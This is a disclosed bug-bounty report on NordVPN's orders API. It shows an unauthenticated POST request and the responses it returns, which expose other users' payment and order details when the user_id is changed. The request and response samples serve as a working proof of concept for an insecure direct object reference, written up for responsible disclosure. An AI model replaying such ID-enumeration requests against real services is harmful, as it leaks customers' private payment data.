# IDOR allow access to payments data of any user

## Report Details
- **Report ID**: 751577
- **URL**: https://hackerone.com/reports/751577
- **State**: Closed
- **Severity**: high
- **Submitted**: 2019-12-04T19:49:45.601Z
- **Disclosed**: 2020-02-05T02:53:18.633Z

## Reporter
- **Username**: dakitu
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nordsecurity

## Vulnerability Information
simple send this POST request (no need any auth):

`POST /api/v1/orders HTTP/1.1
Host: join.nordvpn.com
Accept: application/json
Accept-Language: en-US,en;q=0.5
Content-Type: application/json
Content-Length: 179
DNT: 1
Connection: close`

`{"payment":{"provider_method_account":"6xdxdd","parameters":{}},"action":"order","plan_id":653,"user_id":20027039,"tax_country_code":"TW","payment_retry":0,"is_installment":false}`

will respond:
`{"id":42615458,"user_id":20027039,"confirmation":{"id":23093398,"created_at":"2019-12-04 17:01:35","updated_at":"2019-12-04 17:01:35","type":"redirect_post","value":"{\"url\":\"https:\\\/\\\/www.coinpayments.net\\\/index.php\",\"parameters\":{\"cmd\":\"_pay\",\"reset\":1,\"email\":\"█████\",\"merchant\":\"e64a9629f9a68cdeab5d0edd21b068d3\",\"currency\":\"USD\",\"amountf\":125.64,\"item_name\":\"VPN order\",\"invoice\":\"49476958\",\"success_url\":\"https:\\\/\\\/join.nordvpn.com\\\/payments\\\/callback\\\/264cae0b89e44a7bd263431b68d1122d\",\"cancel_url\":\"https:\\\/\\\/join.nordvpn.com\\\/order\\\/error\\\/?error_alert=payment&eu=1\",\"want_shipping\":0}}"}}`


change user_id to 23093782 and you will get:
`{"id":42616121,"user_id":89495166,"confirmation":{"id":23093782,"created_at":"2019-12-04 17:16:14","updated_at":"2019-12-04 17:16:14","type":"redirect","value":"https:\/\/pay.gocardless.com\/flow\/RE000W16X7XH4JCXJZ623MS6H7W316N3"}}`


change id to 89495247 (my test account) and you will get:
`{"id":42616142,"user_id":89495247,"confirmation":{"id":23093800,"created_at":"2019-12-04 17:16:48","updated_at":"2019-12-04 17:16:48","type":"redirect_post","value":"{\"url\":\"https:\\\/\\\/www.coinpayments.net\\\/index.php\",\"parameters\":{\"cmd\":\"_pay\",\"reset\":1,\"email\":\"hackerhacker@test.pl\",\"merchant\":\"e64a9629f9a68cdeab5d0edd21b068d3\",\"currency\":\"USD\",\"amountf\":125.64,\"item_name\":\"VPN order\",\"invoice\":\"49478089\",\"success_url\":\"https:\\\/\\\/join.nordvpn.com\\\/payments\\\/callback\\\/4513bd083a97e1b5c23c69096d89ac80\",\"cancel_url\":\"https:\\\/\\\/join.nordvpn.com\\\/order\\\/error\\\/?error_alert=payment&eu=0\",\"want_shipping\":0}}"}}`


Just letting You know that i submited this bug today on support@nordvpn.com from lewiatan~@ cause i wasn't able to report it via hackerone.

## Impact

leak sensitive customer data

## Attachments
No attachments
